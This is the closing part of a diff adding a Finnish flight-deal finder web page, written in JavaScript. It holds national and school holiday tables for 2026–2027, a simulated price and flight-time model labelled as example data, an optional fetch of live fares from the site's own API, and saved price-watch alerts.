+"Japani":[["2027-01-01","2027-01-03","Uusivuosi"],["2027-01-11","2027-01-11","Täysi-ikäisyyden päivä"],["2027-02-11","2027-02-11","Kansallispäivä"],["2027-02-23","2027-02-23","Keisarin syntymäpäivä"],["2027-03-21","2027-03-22","Kevätpäiväntasaus"],["2027-04-29","2027-05-05","Golden Week"]],
+"Singapore":[["2026-12-25","2026-12-25","Joulu"],NY,["2027-02-06","2027-02-08","Kiinalainen uusivuosi"],["2027-03-10","2027-03-10","Hari Raya Puasa ~"],["2027-03-26","2027-03-26","Pitkäperjantai"],MAY1,["2027-05-17","2027-05-17","Hari Raya Haji ~"],["2027-05-20","2027-05-20","Vesak"]],
+"Egypti":[["2027-01-07","2027-01-07","Koptilainen joulu"],["2027-01-25","2027-01-25","Vallankumouksen päivä"],["2027-03-09","2027-03-12","Eid al-Fitr ~"],["2027-04-25","2027-04-25","Siinain vapautus"],MAY1,["2027-05-03","2027-05-03","Sham el-Nessim"],["2027-05-15","2027-05-19","Eid al-Adha ~"]],
+"Vietnam":[NY,["2027-02-04","2027-02-10","Tết (kuun uusivuosi)"],["2027-04-30","2027-05-01","Yhdistymispäivä ja vappu"]],
+"Intia":[["2026-12-25","2026-12-25","Joulu"],["2027-01-26","2027-01-26","Tasavallan päivä"],["2027-03-10","2027-03-10","Eid ul-Fitr ~"],["2027-03-22","2027-03-22","Holi"],["2027-03-26","2027-03-26","Pitkäperjantai"],["2027-05-17","2027-05-17","Bakrid ~"],["2027-05-20","2027-05-20","Buddha Purnima ~"]],
+"Indonesia":[["2026-12-25","2026-12-25","Joulu"],NY,["2027-02-06","2027-02-06","Kiinalainen uusivuosi"],["2027-03-09","2027-03-09","Nyepi: Balin lentokenttä suljettu"],["2027-03-10","2027-03-11","Idul Fitri ~"],["2027-03-26","2027-03-26","Pitkäperjantai"],MAY1,ASC,["2027-05-17","2027-05-17","Idul Adha ~"],["2027-05-20","2027-05-20","Waisak ~"]],
+"Pohjois-Makedonia":[NY,["2027-01-07","2027-01-07","Ortodoksinen joulu"],["2027-03-10","2027-03-10","Eid al-Fitr ~"],ORT,MAY1],
+"Albania":[["2026-12-25","2026-12-25","Joulu"],["2027-01-01","2027-01-02","Uusivuosi"],["2027-03-10","2027-03-10","Eid al-Fitr ~"],["2027-03-14","2027-03-14","Kesäpäivä"],["2027-03-22","2027-03-22","Nevruz"],["2027-03-28","2027-03-28","Pääsiäinen"],["2027-05-01","2027-05-02","Vappu ja ort. pääsiäinen"],["2027-05-17","2027-05-17","Kurban Bajrami ~"]],
+"Kosovo":[["2027-01-01","2027-01-02","Uusivuosi"],["2027-01-07","2027-01-07","Ortodoksinen joulu"],["2027-02-17","2027-02-17","Itsenäisyyspäivä"],["2027-03-10","2027-03-10","Eid al-Fitr ~"],["2027-03-28","2027-03-29","Pääsiäinen"],MAY1,["2027-05-02","2027-05-03","Ortodoksinen pääsiäinen"],["2027-05-09","2027-05-09","Eurooppa-päivä"],["2027-05-17","2027-05-17","Kurban Bajrami ~"]]
+};
+/* Suomen koululomat ja pyhät (OPH 2026–2027), nostavat kysyntää Suomesta lähtevillä lennoilla */
+const FI_HOL=[["2026-12-21","2027-01-06","Joululoma"],["2027-02-22","2027-02-26","Hiihtoloma vk 8 (mm. pääkaupunkiseutu, Turku)"],["2027-03-01","2027-03-05","Hiihtoloma vk 9 (mm. Tampere, Jyväskylä, Lahti)"],["2027-03-08","2027-03-12","Hiihtoloma vk 10 (mm. Oulu, Kuopio, Rovaniemi)"],["2027-03-26","2027-03-29","Pääsiäinen"],["2027-04-30","2027-05-01","Vappu"],["2027-05-06","2027-05-06","Helatorstai"]];
+const dfmt=d=>{const [,m,dd]=d.split("-");return `${+dd}.${+m}.`};
+const hspan=h=>h[0]===h[1]?dfmt(h[0]):`${dfmt(h[0])}–${dfmt(h[1])}`;
+const inMonth=(h,m)=>h[0].slice(0,7)<=m&&h[1].slice(0,7)>=m;
+const holsFor=(list,m)=>(list||[]).filter(h=>inMonth(h,m));
+/* Lentoajat (esimerkkimalli): suora ≈ matka/800 km/h + 0,5 h; välilaskulla reitti ~12 % pidempi + 2 h vaihto */
+const NODIRECT_HEL=new Set(["SKP","PRN","TIA","RAK","HAN","GOI","DPS","EDI","NAP","SPU","DBV","KTT","FAO"]);
+function hasDirect(o,d,dist){
+  if(o==="HEL")return !NODIRECT_HEL.has(d);
+  if(o==="ARN"||o==="TLL")return dist<4200&&h(o+d+"dir")>(o==="ARN"?0.2:0.55);
+  return dist<3200&&h(o+d+"dir")>0.85;
+}
+function times(o,d,dist){
+  const direct=hasDirect(o,d,dist)?dist/800+0.5:null;
+  const stop=(dist*1.12)/800+1+2+(h(o+d+"st")*1.5);
+  return {direct,stop};
+}
+function timeOk(t,q){
+  const md=q.maxDirect||0,ms=q.maxStop||0;if(!md&&!ms)return true;
+  const okD=md&&t.direct!=null&&t.direct<=md;
+  const okS=ms&&Math.min(t.stop,t.direct??Infinity)<=ms;
+  return !!(okD||okS);
+}
+const hm=x=>{const m=Math.round(x*60/5)*5;return `${Math.floor(m/60)} h ${String(m%60).padStart(2,"0")} min`};
+const rainCat=mm=>mm<40?0:mm<=80?1:2, dayCat=t=>t<12?0:t<=22?1:2, nightCat=t=>t<3?0:t<=10?1:2;
+const MONTHS=[["2026-12","Joulukuu 2026"],["2027-01","Tammikuu 2027"],["2027-02","Helmikuu 2027"],["2027-03","Maaliskuu 2027"],["2027-04","Huhtikuu 2027"],["2027-05","Toukokuu 2027"]];
+
+function km(a1,o1,a2,o2){const R=6371,r=Math.PI/180,dA=(a2-a1)*r,dO=(o2-o1)*r;const x=Math.sin(dA/2)**2+Math.cos(a1*r)*Math.cos(a2*r)*Math.sin(dO/2)**2;return Math.round(2*R*Math.asin(Math.sqrt(x)))}
+function h(s){let x=2166136261;for(let i=0;i<s.length;i++){x^=s.charCodeAt(i);x=Math.imul(x,16777619)}return ((x>>>0)%10000)/10000}
+function price(o,d,m){
+  const [ ,la,lo]=ORIGINS[o],[ , ,dl,dn]=DEST[d];const dist=km(la,lo,dl,dn);
+  let base=dist>3500?160+dist*0.052:28+dist*0.058;
+  let mult=(0.82+0.45*h(o+d+m))*ORIGIN_FACTOR[o];
+  const deal=h(d+m+"deal"+o)<0.11; if(deal)mult*=0.58;
+  return {p:Math.max(19,Math.round(base*mult)),deal,dist};
+}
+/* Oikea hintadata: Netlify-funktio /api/prices (Travelpayouts / Aviasales). Jos se ei vastaa, käytetään esimerkkidataa. */
+const CITY2KEY={STO:"ARN",LON:"LGW",PAR:"CDG",ROM:"FCO",MIL:"MXP",NYC:"JFK",TYO:"NRT",REK:"KEF",TCI:"TFS",GOX:"GOI"};
+let MODE="example";
+const LIVE={};
+const pending=new Set();
+function liveKey(d,a){if(DEST[a])return a;if(CITY2KEY[d])return CITY2KEY[d];return DEST[d]?d:null}
+async function ensureLive(origins){
+  const need=[];
+  for(const o of origins)for(const [m] of MONTHS){const k=o+"|"+m;if(!LIVE[k]&&!pending.has(k))need.push(k)}
+  if(!need.length)return false;
+  need.forEach(k=>pending.add(k));
+  const os=[...new Set(need.map(k=>k.split("|")[0]))],ms=[...new Set(need.map(k=>k.split("|")[1]))];
+  try{
+    const r=await fetch(`/api/prices?origins=${os.join(",")}&months=${ms.join(",")}`);
+    if(!r.ok)throw new Error("HTTP "+r.status);
+    const j=await r.json();if(!j||!j.offers)throw new Error("tyhjä vastaus");
+    for(const [k,list] of Object.entries(j.offers)){
+      const map={};
+      for(const x of list){const key=liveKey(x.d,x.a);if(!key)continue;if(!map[key]||x.p<map[key].p)map[key]=x}
+      LIVE[k]=map;
+    }
+    MODE="live";return true;
+  }catch(e){return false}
+}
+function liveOffer(o,d,m){const t=LIVE[o+"|"+m];return t?t[d]:undefined}
+const ALL3=[0,1,2],ALL5=[1,2,3,4,5];
+function norm(q){return {pl:ALL5,rain:ALL3,day:ALL3,night:ALL3,...q}}
+function climOk(d,mi,q){const c=CLIM[d][mi];return q.rain.includes(rainCat(c[2]))&&q.day.includes(dayCat(c[0]))&&q.night.includes(nightCat(c[1]))}
+function best(o,d,q){
+  let b=null;
+  const dist=km(ORIGINS[o][1],ORIGINS[o][2],DEST[d][2],DEST[d][3]);
+  MONTHS.forEach(([m],mi)=>{
+    if(q.month!=="all"&&q.month!==m)return;
+    if(!climOk(d,mi,q))return;
+    let r,t;
+    if(MODE==="live"){
+      const x=liveOffer(o,d,m);if(!x)return;
+      const hrs=x.dur?x.dur/60:null;
+      t={direct:x.tr===0?hrs:null,stop:x.tr<=1&&hrs!=null?hrs:Infinity,dur:hrs};
+      r={p:Math.round(x.p),deal:false,dist,live:x};
+    }else{t=times(o,d,dist);r=price(o,d,m)}
+    if(!timeOk(t,q))return;
+    if(!b||r.p<b.p)b={...r,m,mi,t};
+  });
+  return b;
+}
+const $=id=>document.getElementById(id);
+const S={origin:"HEL",month:"all",maxPrice:150,maxKm:3000,minKm:0,near:false,radius:250,pl:[1,2,3,4,5],rain:[0,1,2],day:[0,1,2],night:[0,1,2],maxDirect:0,maxStop:0};
+
+$("origin").innerHTML=Object.entries(ORIGINS).map(([c,v])=>`<option value="${c}">${v[0]} (${c})</option>`).join("");
+$("month").innerHTML=`<option value="all">Joustava: halvin kuukausi</option>`+MONTHS.map(([v,l])=>`<option value="${v}">${l}</option>`).join("");
+const monthName=m=>(MONTHS.find(x=>x[0]===m)||[0,""])[1];
+const fmt=n=>n.toLocaleString("fi-FI");
+
+function originsInUse(){
+  if(!S.near)return [S.origin];
+  const [ ,a,o]=ORIGINS[S.origin];
+  return Object.keys(ORIGINS).filter(c=>c===S.origin||km(a,o,ORIGINS[c][1],ORIGINS[c][2])<=S.radius);
+}
+function search(q){
+  q=norm(q);const os=q.origins, out=[];
+  for(const d of Object.keys(DEST)){
+    if(os.includes(d))continue;
+    if(!q.pl.includes(plLevel(PLI[DEST[d][1]])))continue;
+    const [ ,ha,ho]=ORIGINS[q.origin];const dKm=km(ha,ho,DEST[d][2],DEST[d][3]);
+    if(dKm<q.minKm||dKm>q.maxKm)continue;
+    let b=null;
+    for(const o of os){if(o===d)continue;const r=best(o,d,q);if(r&&(!b||r.p<b.p))b={...r,o}}
+    if(b&&b.p<=q.maxPrice)out.push({d,...b,homeKm:dKm});
+  }
+  return out.sort((a,b)=>a.p-b.p);
+}
+
+const CHIPS={
+  pl:[[1,"1","alle 50"],[2,"2","50–74"],[3,"3","75–114"],[4,"4","115–144"],[5,"5","145+"]],
+  rain:[[0,"Vähäinen","alle 40 mm/kk"],[1,"Kohtalainen","40–80 mm"],[2,"Runsas","yli 80 mm"]],
+  day:[[0,"Viileä","alle 12 °C"],[1,"Lauha","12–22 °C"],[2,"Lämmin","yli 22 °C"]],
+  night:[[0,"Kylmä","alle 3 °C"],[1,"Viileä","3–10 °C"],[2,"Lämmin","yli 10 °C"]]
+};
+document.querySelectorAll(".chips[data-k]").forEach(box=>{
+  const k=box.dataset.k;
+  box.innerHTML=CHIPS[k].map(([v,l,s])=>`<button type="button" class="chip" id="c-${k}-${v}" data-v="${v}">${l}${s?`<small>${s}</small>`:""}</button>`).join("");
+  box.addEventListener("click",e=>{const b=e.target.closest(".chip");if(!b)return;const v=+b.dataset.v;
+    const arr=S[k];S[k]=arr.includes(v)?arr.filter(x=>x!==v):[...arr,v].sort();
+    if(!S[k].length)S[k]=CHIPS[k].map(c=>c[0]);render()});
+});
+const dfmtISO=t=>{if(!t)return"";const d=new Date(t);return isNaN(d)?"":`${d.getDate()}.${d.getMonth()+1}.`};
+const plDots=n=>`<span class="pl" title="Hintataso ${n}/5">${"€".repeat(n)}<i>${"€".repeat(5-n)}</i></span>`;
+function setMode(){
+  const el=document.querySelector(".demo");
+  el.textContent=MODE==="live"?"Oikeat hinnat · Aviasales":"Prototyyppi · esimerkkidata";
+  el.classList.toggle("live",MODE==="live");
+}
+function render(){
+  setMode();
+  ensureLive(originsInUse()).then(ch=>{if(ch){render();renderWatches()}});
+  for(const k in CHIPS)for(const [v] of CHIPS[k])$(`c-${k}-${v}`).setAttribute("aria-pressed",S[k].includes(v));
+  $("maxPriceV").textContent=`${S.maxPrice} €`;
+  $("maxDirectV").textContent=S.maxDirect?hm(S.maxDirect):"ei rajaa";
+  $("maxStopV").textContent=S.maxStop?hm(S.maxStop):"ei rajaa";
+  $("maxKmV").textContent=`${fmt(S.maxKm)} km`;
+  $("minKmV").textContent=S.minKm?`${fmt(S.minKm)} km`:"ei rajaa";
+  $("radiusV").textContent=`${S.radius} km`;
+  $("depOne").setAttribute("aria-pressed",!S.near);$("depNear").setAttribute("aria-pressed",S.near);
+  $("radiusBox").hidden=!S.near;
+  const os=originsInUse();
+  if(S.near){const [ ,a,o]=ORIGINS[S.origin];$("nearList").textContent="Mukana: "+os.map(c=>c===S.origin?`${ORIGINS[c][0]}`:`${ORIGINS[c][0]} (${km(a,o,ORIGINS[c][1],ORIGINS[c][2])} km)`).join(", ")}
+  const q={...S,origins:os};
+  const res=search(q);
+  $("summary").textContent=describe(S);
+  $("board").innerHTML=`<span>LÄHTÖ <b>${os.join(" / ")}</b></span><span>OSUMIA <b>${res.length}</b></span><span>HALVIN <b>${res[0]?res[0].p+" €":"–"}</b></span>`;
+  $("liveTxt").innerHTML=res.length?`<b>${res.length}</b> ${res.length===1?"kohde":"kohdetta"} · halvin <b>${res[0].p} €</b> ${DEST[res[0].d][0]}`:"Ei osumia näillä rajoilla";
+  const fiM=S.month!=="all"?S.month:(res[0]&&res[0].m);
+  const fh=fiM?holsFor(FI_HOL,fiM):[];
+  $("fiHols").hidden=!fh.length;
+  $("fiHols").innerHTML=fh.length?`<span class="lbl">Suomen lomat ${monthName(fiM).toLowerCase()}${S.month==="all"?" (halvimman osuman kuukausi)":""}</span>`+fh.map(h=>`<span class="hol fi">${h[2]} ${hspan(h)}</span>`).join(""):"";
+  $("results").innerHTML=res.length?res.slice(0,30).map(r=>{
+    const D=DEST[r.d],c=CLIM[r.d][r.mi];
+    return `<div class="ticket"><div class="route">${r.o} <span>→</span> ${r.d}</div>
+      <div class="city"><strong>${D[0]}${r.deal?'<span class="tag">Tarjous</span>':""}</strong><small>${D[1]} · ${fmt(r.dist)} km · ${monthName(r.m)}</small>
+      <div class="facts">${plDots(plLevel(PLI[D[1]]))}<span>päivä ${c[0]} °C</span><span>yö ${c[1]} °C</span><span>sade ${c[2]} mm</span></div><div class="facts">${r.live?`<span>${r.live.tr===0?"suora":r.live.tr===1?"1 välilasku":r.live.tr+" välilaskua"}${r.t.dur?" · menomatka "+hm(r.t.dur):""}</span><span>${dfmtISO(r.live.dep)}${r.live.ret?" – "+dfmtISO(r.live.ret):""}</span>`:`<span>${r.t.direct!=null?"suora "+hm(r.t.direct):"ei suoraa lentoa"}</span><span>1 välilasku ${hm(r.t.stop)}</span>`}</div>${r.live&&r.live.link?`<a class="book" href="${esc(r.live.link)}" target="_blank" rel="noopener">Katso lento ja varaa →</a>`:""}${(()=>{const hs=holsFor(HOL[D[1]],r.m);return hs.length?`<div class="hols">${hs.map(h=>`<span class="hol${/suljettu/.test(h[2])?" warn":""}">${h[2]} ${hspan(h)}</span>`).join("")}</div>`:""})()}</div>
+      <div class="price">${r.p} €<small>meno-paluu</small></div></div>`}).join("")
+    :`<div class="empty">Ei kohteita näillä rajoilla. Nosta hintarajaa tai laajenna kilometrirajausta.</div>`;
+}
+function describe(s){
+  const parts=[`${ORIGINS[s.origin][0]}${s.near?` + ${s.radius} km`:""}`,`alle ${s.maxPrice} €`,s.minKm?`${fmt(s.minKm)}–${fmt(s.maxKm)} km`:`alle ${fmt(s.maxKm)} km`,s.month==="all"?"joustava aika":monthName(s.month).toLowerCase()];
+  const n=norm(s),lab=(k,arr)=>arr.length<CHIPS[k].length?arr.map(v=>CHIPS[k].find(c=>c[0]===v)[1].toLowerCase()).join("/"):null;
+  if(s.maxDirect)parts.push("suora ≤ "+hm(s.maxDirect));
+  if(s.maxStop)parts.push("1 välilasku ≤ "+hm(s.maxStop));
+  const pl=lab("pl",n.pl);if(pl)parts.push("hintataso "+pl);
+  const r=lab("rain",n.rain);if(r)parts.push("sade "+r);
+  const d=lab("day",n.day);if(d)parts.push("päivä "+d);
+  const ni=lab("night",n.night);if(ni)parts.push("yö "+ni);
+  return parts.join(" · ");
+}
+
+/* Seuratut haut */
+let watches=[];
+try{watches=JSON.parse(localStorage.getItem("lentovahti-w")||"null")||null}catch(e){watches=null}
+if(!watches)watches=[
+  {id:"ex1",s:{origin:"HEL",month:"all",maxPrice:250,maxKm:6000,minKm:1500,near:true,radius:200,day:[2],rain:[0,1]},alert:180,example:true},
+  {id:"ex2",s:{origin:"HEL",month:"2027-02",maxPrice:500,maxKm:10000,minKm:5000,near:false,radius:250},alert:400,example:true}
+];
+function persist(){try{localStorage.setItem("lentovahti-w",JSON.stringify(watches))}catch(e){}}
+function history(w,cur){
+  const pts=[];
+  for(let i=29;i>=0;i--){const n=h(w.id+"d"+i);pts.push(i===0?cur:Math.round(cur*(0.92+0.3*n)))}
+  return pts;
+}
+function watchOrigins(w){const s=w.s;const [ ,a,o]=ORIGINS[s.origin];return s.near?Object.keys(ORIGINS).filter(c=>c===s.origin||km(a,o,ORIGINS[c][1],ORIGINS[c][2])<=s.radius):[s.origin]}
+function currentBest(w){
+  const s=w.s;const [ ,a,o]=ORIGINS[s.origin];
+  const os=s.near?Object.keys(ORIGINS).filter(c=>c===s.origin||km(a,o,ORIGINS[c][1],ORIGINS[c][2])<=s.radius):[s.origin];
+  const r=search({...s,maxPrice:99999,origins:os});return r[0]?{p:r[0].p,r:r[0]}:null;
+}
+function spark(pts){
+  const W=120,H=36,min=Math.min(...pts),max=Math.max(...pts),rng=max-min||1;
+  const xy=pts.map((v,i)=>[i*(W-4)/(pts.length-1)+2,H-4-(v-min)/rng*(H-8)]);
+  const d=xy.map((p,i)=>(i?"L":"M")+p[0].toFixed(1)+" "+p[1].toFixed(1)).join(" ");
+  const last=xy[xy.length-1];
+  return `<svg viewBox="0 0 ${W} ${H}" aria-hidden="true"><path d="${d} L${last[0]} ${H} L2 ${H}Z" fill="var(--accent)" opacity=".15"/><path d="${d}" fill="none" stroke="var(--accent)" stroke-width="1.6"/><circle cx="${last[0]}" cy="${last[1]}" r="2.6" fill="var(--ink)"/></svg>`;
+}
+function renderWatches(){
+  if(!watches.length){$("watches").innerHTML=`<div class="empty">Ei seurattuja hakuja. Säädä haku yllä ja paina "Tallenna seurantaan".</div>`;return}
+  $("watches").innerHTML=watches.map(w=>{
+    const cb=currentBest(w);
+    if(!cb)return `<div class="watch"><div><div class="q">${describe(w.s)}</div><div class="meta">Ei osumia juuri nyt.</div></div></div>`;
+    if(MODE==="live")ensureLive(watchOrigins(w)).then(ch=>{if(ch)renderWatches()});
+    const pts=history(w,cb.p);
+    const wk=pts[pts.length-8],diff=cb.p-wk;
+    const D=DEST[cb.r.d];
+    return `<div class="watch"><div>
+      <div class="q">${w.name?`${esc(w.name)}<div class="meta" style="font-weight:400">${describe(w.s)}</div>`:describe(w.s)}${w.example?' <span class="tag" style="background:var(--bg);color:var(--muted)">Esimerkki</span>':""}</div>
+      <div class="meta">Halvin nyt: <strong style="color:var(--ink)">${cb.p} €</strong> ${cb.r.o}→${cb.r.d} ${D[0]}, ${monthName(cb.r.m).toLowerCase()}
+      ${MODE==="live"?"":`<span class="chg ${diff<0?"down":"up"}">${diff<0?"▼":"▲"} ${Math.abs(diff)} € / 7 pv</span>`}</div>
+      <div class="meta">Hälytys alle ${w.alert} €${w.drop?` tai −${w.drop} %`:""} · ${CHAN[w.chan||0]} · ${FREQ[w.freq??1]}${w.quiet?" · hiljaa 22–08":""} ${cb.p<=w.alert?'<span class="alert">· Raja alittunut, ilmoitus lähtisi nyt</span>':""}</div>
+      <div class="meta"><button class="x" data-edit="${w.id}">Muokkaa</button> · <button class="x" data-del="${w.id}">Poista</button></div>
+    </div>${MODE==="live"?"":spark(pts)}</div>`}).join("");
+}
+$("watches").addEventListener("click",e=>{const t=e.target;if(!t.getAttribute)return;
+  const ed=t.getAttribute("data-edit");if(ed){openAlert(watches.find(w=>w.id===ed));return}
+  const id=t.getAttribute("data-del");if(!id)return;watches=watches.filter(w=>w.id!==id);persist();renderWatches();toast("Seuranta poistettu")});
+function toast(t){const el=document.createElement("div");el.className="toast";el.textContent=t;document.body.appendChild(el);setTimeout(()=>el.remove(),1800)}
+const CHAN=["Puhelimeen (push)","Telegram","Sähköposti"],FREQ=["tunnin välein","4 kertaa päivässä","kerran päivässä"];
+const esc=t=>String(t).replace(/[&<>"]/g,c=>({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;"}[c]));
+let A=null;
+function chipRow(el,labels,sel,onPick){el.innerHTML=labels.map((l,i)=>`<button type="button" class="chip" aria-pressed="${i===sel}" data-i="${i}">${l}</button>`).join("");el.onclick=e=>{const b=e.target.closest(".chip");if(!b)return;onPick(+b.dataset.i)}}
+function drawAlertChips(){chipRow($("aChan"),CHAN,A.chan,i=>{A.chan=i;drawAlertChips()});chipRow($("aFreq"),FREQ,A.freq,i=>{A.freq=i;drawAlertChips()})}
+function openAlert(w){
+  A=w?{...w}:{id:null,s:JSON.parse(JSON.stringify(S)),name:"",alert:Math.round(S.maxPrice*0.8),drop:0,chan:0,freq:1,quiet:true,onlyNew:true};
+  $("alertQ").textContent="Haku: "+describe(A.s);
+  $("aName").value=A.name||"";$("aPrice").value=A.alert;$("aDrop").value=A.drop||"";
+  $("aQuiet").checked=!!A.quiet;$("aNew").checked=!!A.onlyNew;
+  $("aSave").textContent=A.id?"Tallenna muutokset":"Tallenna seuranta";
+  drawAlertChips();$("alertPanel").hidden=false;
+  $("alertPanel").scrollIntoView({behavior:matchMedia("(prefers-reduced-motion: reduce)").matches?"auto":"smooth",block:"start"});
+  $("aName").focus({preventScroll:true});
+}
+$("saveBtn").addEventListener("click",()=>openAlert(null));
+$("aCancel").addEventListener("click",()=>{$("alertPanel").hidden=true;A=null});
+$("aSave").addEventListener("click",()=>{
+  const price=+$("aPrice").value;
+  if(!price||price<10){toast("Anna hälytysraja euroina, vähintään 10 €");$("aPrice").focus();return}
+  Object.assign(A,{name:$("aName").value.trim(),alert:Math.round(price),drop:Math.max(0,Math.min(90,+$("aDrop").value||0)),quiet:$("aQuiet").checked,onlyNew:$("aNew").checked});
+  delete A.example;
+  if(A.id){watches=watches.map(w=>w.id===A.id?A:w);toast("Seuranta päivitetty")}
+  else{A.id="w"+Date.now();watches.unshift(A);toast("Seuranta tallennettu")}
+  persist();renderWatches();$("alertPanel").hidden=true;A=null;
+  $("watches").scrollIntoView({block:"start"});
+});
+$("liveGo").addEventListener("click",()=>$("board").scrollIntoView({behavior:matchMedia("(prefers-reduced-motion: reduce)").matches?"auto":"smooth",block:"start"}));
+try{new IntersectionObserver(es=>{const vis=es.some(e=>e.isIntersecting);$("liveBar").classList.toggle("off",vis)},{threshold:0}).observe($("board"))}catch(e){}
+
+for(const k of ["maxPrice","maxKm","minKm","radius","maxDirect","maxStop"])$(k).addEventListener("input",e=>{S[k]=+e.target.value;if(k==="minKm"&&S.minKm>S.maxKm){S.maxKm=S.minKm;$("maxKm").value=S.maxKm}if(k==="maxKm"&&S.maxKm<S.minKm){S.minKm=S.maxKm;$("minKm").value=S.minKm}render()});
+$("origin").addEventListener("change",e=>{S.origin=e.target.value;render()});
+$("month").addEventListener("change",e=>{S.month=e.target.value;render()});
+$("depOne").addEventListener("click",()=>{S.near=false;render()});
+$("depNear").addEventListener("click",()=>{S.near=true;render()});
+render();renderWatches();
+})();
+</script>
+
+</body>
+</html>
